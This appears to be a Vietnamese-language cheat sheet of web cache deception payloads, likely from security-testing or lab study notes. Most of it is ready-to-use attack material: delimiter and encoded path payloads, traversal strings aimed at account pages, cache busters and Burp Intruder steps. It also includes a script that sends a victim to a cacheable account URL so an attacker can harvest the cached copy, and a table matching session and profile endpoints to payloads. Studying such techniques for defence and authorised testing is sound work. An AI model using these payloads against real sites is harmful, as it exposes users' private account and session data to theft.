# Bảng tra nhanh payload

## Mục đích

Bảng tra nhanh này tập trung vào payload/kỹ thuật để:

- Nhanh chóng fuzz discrepancy.
- Tái hiện WCD theo từng pattern.
- Giảm sai sót khi test trong Burp/Repeater/Intruder.

## 1) Payload baseline

## Kiểm tra route baseline

- `/target`
- `/targetabc`
- `/target/abc`

Dùng để xác định origin map path ra sao.

## 2) Nhóm extension nên thử để kích hoạt quy tắc cache

- `.css`
- `.js`
- `.ico`
- `.exe`
- `.jpg`

Không phải hệ thống nào cũng dùng tập extension giống nhau. Nên thử nhiều loại.

## 3) Nhóm delimiter nên thử

## Plain

- `;` `?` `#` `:` `.` `/`

## Encoded

- `%23` `%3f` `%2f` `%2e` `%00` `%09` `%0a`

Danh sách đầy đủ tham khảo trong: `reference/delimiter_list.txt`.

## 4) Mẫu payload theo từng pattern

## Path mapping

- `/dynamic/extra.js`
- `/dynamic/non-existent.css`

## Delimiter discrepancy

- `/dynamic;wcd.js`
- `/dynamic;test.css`

## Delimiter decoding discrepancy

- `/dynamic%23wcd.css`
- `/dynamic%3fwcd.js`

## Origin normalization discrepancy

- `/resources/..%2fdynamic`
- `/assets/..%2fmy-account`

## Cache normalization discrepancy

- `/dynamic%23%2f%2e%2e%2fresources`
- `/dynamic;%2f%2e%2e%2fresources`

## Exact file-name rules

- `/dynamic%23%2f%2e%2e%2findex.html`
- `/dynamic;%2f%2e%2e%2ffavicon.ico`

## 5) Mẫu cache buster

- `?cb=1711223344`
- `?wcd=<random>`
- `?cachebust=<uuid>`

Mục tiêu: mỗi lần test có cache key mới.

## 6) Checklist oracle

1. Header `X-Cache` hoặc `CF-Cache-Status`.
2. Header `Age`.
3. Response time diff.
4. Nội dung body có data nhạy cảm hay không.

## 7) Gợi ý quy trình Intruder

1. Payload position sau path gốc: `/target§§abc`.
2. Nạp delimiter list plain + encoded.
3. Tắt auto URL encoding nếu cần.
4. Lọc kết quả theo status/body length/cache header.

## 8) Rào chắn false positive

- 404 cache hit không đồng nghĩa WCD.
- Redirect login có thể làm body thay đổi giả.
- Raw `#` có thể bị browser xử lý trước khi request tới server.

## 9) Mẫu exploit URL cho victim priming

```html
<script>
  document.location = "https://target.example/my-account;wcd.js?cb=NEWKEY";
</script>
```

Sau khi victim truy cập, attacker request lại cùng URL để harvest.

## 10) Mapping nhanh endpoint -> payload thử đầu tiên

| Loại endpoint              | Payload ưu tiên                    |
| -------------------------- | ---------------------------------- |
| Profile/account            | `/my-account;wcd.js?cb=1`          |
| API session                | `/api/auth/session%23wcd.css?cb=1` |
| Endpoint sau static prefix | `/resources/..%2fmy-account?cb=1`  |

## Liên kết đọc tiếp

- [03-attack-surface-and-detection.md](03-attack-surface-and-detection.md)
- [08-exploitation-workflows.md](08-exploitation-workflows.md)
- [09-lab-playbooks.md](09-lab-playbooks.md)
